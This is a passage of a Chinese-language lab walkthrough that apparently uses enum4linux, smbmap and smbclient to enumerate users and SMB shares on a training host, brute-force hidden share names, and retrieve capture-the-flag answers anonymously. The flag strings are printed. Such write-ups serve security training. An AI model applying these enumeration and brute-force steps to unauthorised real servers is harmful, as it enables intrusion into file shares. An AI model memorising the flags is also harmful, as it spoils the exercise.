|    Getting domain SID for demo.ine.local    |
 ============================================= 
Domain Name: EVILCORP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 =============================== 
|    Users on demo.ine.local    |
 =============================== 
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: ecorp    Name:   Desc: 
index: 0x2 RID: 0x3ea acb: 0x00000010 Account: william  Name:   Desc: 
index: 0x3 RID: 0x3ec acb: 0x00000010 Account: raymond  Name:   Desc: 
index: 0x4 RID: 0x3e9 acb: 0x00000010 Account: michael  Name:   Desc: 
index: 0x5 RID: 0x3eb acb: 0x00000010 Account: elliot   Name:   Desc: 
index: 0x6 RID: 0x3ed acb: 0x00000010 Account: admin    Name:   Desc: 

user:[ecorp] rid:[0x3e8]
user:[william] rid:[0x3ea]
user:[raymond] rid:[0x3ec]
user:[michael] rid:[0x3e9]
user:[elliot] rid:[0x3eb]
user:[admin] rid:[0x3ed]
enum4linux complete on Thu Jul 21 20:13:27 2022
```

请注意demo.ine.local上有 6 个用户： `- ecorp - william - raymond - michael - elliot - admin`

使用smbmap工具获取共享列表及其权限：

参考：[smbmap](https://www.kali.org/tools/smbmap/#:~:text=SMBMap%20allows%20users%20to%20enumerate,and%20even%20execute%20remote%20commands.)

命令：

```
smbmap -H demo.ine.local
```

请注意，仅列出了 4 个用户的共享。对于用户raymond和michael，共享要么不存在，要么无法被发现！

```
root@INE:~# smbmap -H demo.ine.local
[+] IP: demo.ine.local:445      Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        public                                                  READ, WRITE     This is a publically accessible share.
        ecorp                                                   NO ACCESS
        william                                                 NO ACCESS
        elliot                                                  NO ACCESS
        admin                                                   NO ACCESS
        share$                                                  NO ACCESS
        IPC$                                                    NO ACCESS       IPC Service (evilcorp.smb.shares)
```

让我们使用smbclient实用程序找出答案：

命令：

```
smbclient //demo.ine.local/raymond -N
smbclient //demo.ine.local/michael -N
```

```
root@INE:~# smbclient //demo.ine.local/raymond -N
tree connect failed: NT_STATUS_ACCESS_DENIED
root@INE:~# smbclient //demo.ine.local/michael -N
Try "help" to get a list of possible commands.
smb: \> 

```

对于raymond的共享，我们被拒绝访问。它存在（并且不可发现），但如果没有有效密码则无法访问。但是我们可以在不需要密码的情况下访问michael的共享！

命令：

```
ls
cd dir\
ls
cd flag_2\
ls
get -
```

```
root@INE:~# smbclient //demo.ine.local/raymond -N
tree connect failed: NT_STATUS_ACCESS_DENIED
root@INE:~# smbclient //demo.ine.local/michael -N
Try "help" to get a list of possible commands.
smb: \> LS
  .                                   D        0  Tue Nov 16 20:35:43 2021
  ..                                  D        0  Tue Nov 16 20:35:40 2021
  dir                                 D        0  Tue Nov 16 20:35:43 2021

                1981094964 blocks of size 1024. 123167016 blocks available
smb: \> cd dir
smb: \dir\> ls
  .                                   D        0  Tue Nov 16 20:35:43 2021
  ..                                  D        0  Tue Nov 16 20:35:43 2021
  folder23                            D        0  Tue Nov 16 20:35:43 2021
  folder61                            D        0  Tue Nov 16 20:35:43 2021
  folder84                            D        0  Tue Nov 16 20:35:43 2021
  folder78                            D        0  Tue Nov 16 20:35:43 2021
  folder67                            D        0  Tue Nov 16 20:35:43 2021
  folder15                            D        0  Tue Nov 16 20:35:43 2021
  folder13                            D        0  Tue Nov 16 20:35:43 2021
  folder49                            D        0  Tue Nov 16 20:35:43 2021
  folder63                            D        0  Tue Nov 16 20:35:43 2021
  folder30                            D        0  Tue Nov 16 20:35:43 2021
  folder8                             D        0  Tue Nov 16 20:35:43 2021
  folder24                            D        0  Tue Nov 16 20:35:43 2021
  folder56                            D        0  Tue Nov 16 20:35:43 2021
  folder85                            D        0  Tue Nov 16 20:35:43 2021
  folder51                            D        0  Tue Nov 16 20:35:43 2021
  folder31                            D        0  Tue Nov 16 20:35:43 2021
  folder71                            D        0  Tue Nov 16 20:35:43 2021
  folder73                            D        0  Tue Nov 16 20:35:43 2021
  folder75                            D        0  Tue Nov 16 20:35:43 2021
  folder52                            D        0  Tue Nov 16 20:35:43 2021
  folder22                            D        0  Tue Nov 16 20:35:43 2021
  folder88                            D        0  Tue Nov 16 20:35:43 2021
  folder69                            D        0  Tue Nov 16 20:35:43 2021
  folder87                            D        0  Tue Nov 16 20:35:43 2021
  folder21                            D        0  Tue Nov 16 20:35:43 2021
  folder38                            D        0  Tue Nov 16 20:35:43 2021
  folder80                            D        0  Tue Nov 16 20:35:43 2021
  folder60                            D        0  Tue Nov 16 20:35:43 2021
  folder83                            D        0  Tue Nov 16 20:35:43 2021
  folder46                            D        0  Tue Nov 16 20:35:43 2021
  folder95                            D        0  Tue Nov 16 20:35:43 2021
  folder68                            D        0  Tue Nov 16 20:35:43 2021
  folder77                            D        0  Tue Nov 16 20:35:43 2021
  folder27                            D        0  Tue Nov 16 20:35:43 2021
  folder89                            D        0  Tue Nov 16 20:35:43 2021
  folder39                            D        0  Tue Nov 16 20:35:43 2021
  folder70                            D        0  Tue Nov 16 20:35:43 2021
  folder74                            D        0  Tue Nov 16 20:35:43 2021
  folder29                            D        0  Tue Nov 16 20:35:43 2021
  folder59                            D        0  Tue Nov 16 20:35:43 2021
  folder90                            D        0  Tue Nov 16 20:35:43 2021
  folder82                            D        0  Tue Nov 16 20:35:43 2021
  folder76                            D        0  Tue Nov 16 20:35:43 2021
  folder57                            D        0  Tue Nov 16 20:35:43 2021
  flag_2                              D        0  Tue Nov 16 20:35:43 2021
  folder55                            D        0  Tue Nov 16 20:35:43 2021
  folder50                            D        0  Tue Nov 16 20:35:43 2021
  folder33                            D        0  Tue Nov 16 20:35:43 2021
  folder1                             D        0  Tue Nov 16 20:35:43 2021
  folder53                            D        0  Tue Nov 16 20:35:43 2021
  folder93                            D        0  Tue Nov 16 20:35:43 2021
  folder98                            D        0  Tue Nov 16 20:35:43 2021
  folder48                            D        0  Tue Nov 16 20:35:43 2021
  folder92                            D        0  Tue Nov 16 20:35:43 2021
  folder47                            D        0  Tue Nov 16 20:35:43 2021
  folder12                            D        0  Tue Nov 16 20:35:43 2021
  folder96                            D        0  Tue Nov 16 20:35:43 2021
  folder4                             D        0  Tue Nov 16 20:35:43 2021
  folder35                            D        0  Tue Nov 16 20:35:43 2021
  folder26                            D        0  Tue Nov 16 20:35:43 2021
  folder6                             D        0  Tue Nov 16 20:35:43 2021
  folder40                            D        0  Tue Nov 16 20:35:43 2021
  folder94                            D        0  Tue Nov 16 20:35:43 2021
  folder79                            D        0  Tue Nov 16 20:35:43 2021
  folder43                            D        0  Tue Nov 16 20:35:43 2021
  folder19                            D        0  Tue Nov 16 20:35:43 2021
  folder65                            D        0  Tue Nov 16 20:35:43 2021
  folder37                            D        0  Tue Nov 16 20:35:43 2021
  folder66                            D        0  Tue Nov 16 20:35:43 2021
  folder91                            D        0  Tue Nov 16 20:35:43 2021
  folder42                            D        0  Tue Nov 16 20:35:43 2021
  folder3                             D        0  Tue Nov 16 20:35:43 2021
  folder20                            D        0  Tue Nov 16 20:35:43 2021
  folder45                            D        0  Tue Nov 16 20:35:43 2021
  folder14                            D        0  Tue Nov 16 20:35:43 2021
  folder100                           D        0  Tue Nov 16 20:35:43 2021
  folder28                            D        0  Tue Nov 16 20:35:43 2021
  folder72                            D        0  Tue Nov 16 20:35:43 2021
  folder58                            D        0  Tue Nov 16 20:35:43 2021
  folder54                            D        0  Tue Nov 16 20:35:43 2021
  folder86                            D        0  Tue Nov 16 20:35:43 2021
  folder5                             D        0  Tue Nov 16 20:35:43 2021
  folder36                            D        0  Tue Nov 16 20:35:43 2021
  folder34                            D        0  Tue Nov 16 20:35:43 2021
  folder7                             D        0  Tue Nov 16 20:35:43 2021
  folder17                            D        0  Tue Nov 16 20:35:43 2021
  folder25                            D        0  Tue Nov 16 20:35:43 2021
  folder97                            D        0  Tue Nov 16 20:35:43 2021
  folder81                            D        0  Tue Nov 16 20:35:43 2021
  folder41                            D        0  Tue Nov 16 20:35:43 2021
  folder62                            D        0  Tue Nov 16 20:35:43 2021
  folder16                            D        0  Tue Nov 16 20:35:43 2021
  folder44                            D        0  Tue Nov 16 20:35:43 2021
  folder18                            D        0  Tue Nov 16 20:35:43 2021
  folder64                            D        0  Tue Nov 16 20:35:43 2021
  folder32                            D        0  Tue Nov 16 20:35:43 2021
  folder2                             D        0  Tue Nov 16 20:35:43 2021
  folder9                             D        0  Tue Nov 16 20:35:43 2021
  folder11                            D        0  Tue Nov 16 20:35:43 2021
  folder99                            D        0  Tue Nov 16 20:35:43 2021
  folder10                            D        0  Tue Nov 16 20:35:43 2021

                1981094964 blocks of size 1024. 123167016 blocks available
smb: \dir\> 
smb: \dir\> cd flag_2
smb: \dir\flag_2\> ls
  .                                   D        0  Tue Nov 16 20:35:43 2021
  ..                                  D        0  Tue Nov 16 20:35:43 2021
  -                                   N       33  Tue Nov 16 20:35:43 2021

                1981094964 blocks of size 1024. 123167056 blocks available
smb: \dir\flag_2\> get -
jtiz1hI467CrRgPDeuDo4u1fCAdMsQFs
getting file \dir\flag_2\- of size 33 as - (10.7 KiloBytes/sec) (average 10.7 KiloBytes/sec)
```

上述命令列出文件，然后从flag_2目录中获取flag。

如果您注意到，flag_2目录中的文件名为`-`，这是分配给标准输出的特殊名称。发出`get -`实际将文件下载到名为`-`. 由于这映射到标准输出，文件内容被回显，而不是下载主机上指定的`-`文件。

flag 2： `jtiz1hI467CrRgPDeuDo4u1fCAdMsQFs`

第 8 步：使用enum4linux工具发现另一个不可浏览的共享。

使用以下命令使用指定的单词列表暴力破解共享名称：

命令：

```
enum4linux -s ~/Desktop/wordlists/100-common-passwords.txt demo.ine.local
```

```
root@INE:~# enum4linux -s /root/Desktop/wordlists/100-common-passwords.txt demo.ine.local
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Jul 21 20:22:12 2022

 ========================== 
|    Target Information    |
 ========================== 
Target ........... demo.ine.local
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ====================================================== 
|    Enumerating Workgroup/Domain on demo.ine.local    |
 ====================================================== 
[+] Got domain/workgroup name: EVILCORP

 ======================================= 
|    Session Check on demo.ine.local    |
 ======================================= 
[+] Server demo.ine.local allows sessions using username '', password ''

 ============================================= 
|    Getting domain SID for demo.ine.local    |
 ============================================= 
Domain Name: EVILCORP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ======================================================= 
|    Brute Force Share Enumeration on demo.ine.local    |
 ======================================================= 
shadow1 EXISTS, Allows access using username: '', password: ''
ERROR: Share name iloveyou! contains some illegal characters
```

注意输出的最后几行：

```
shadow1 EXISTS, Allows access using username: '', password: ''
```

这意味着存在一个名为`shadow1`的共享，它可以接受空凭据！

可以忽略输出的最后一行 - 它表示单词列表中的名称不是有效的共享名称，因为它包含感叹号 (`!`)。

使用smbclient实用程序连接到新发现的共享shadow1并从中检索flag：

命令：

```
smbclient //demo.ine.local/shadow1 -N
```

命令（在 smb 会话中发出）：

```
ls
get flag_3 -
```

```
root@INE:~# smbclient //demo.ine.local/shadow1 -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Nov 16 20:35:43 2021
  ..                                  D        0  Tue Nov 16 20:35:40 2021
  services                            D        0  Tue Nov 16 20:35:43 2021
  flag_3                              N       33  Tue Nov 16 20:35:43 2021

                1981094964 blocks of size 1024. 123166724 blocks available
smb: \> get flag_3 -
YrcxI1WVRN9gmIO4jJINdjSfOMf5SKsG
getting file \flag_3 of size 33 as - (32.2 KiloBytes/sec) (average 32.2 KiloBytes/sec)
```

flag 3： `YrcxI1WVRN9gmIO4jJINdjSfOMf5SKsG`

这就是我们如何使用不同的工具和实用程序来检测和利用可浏览和不可浏览的共享，从而允许匿名用户不受限制地访问！




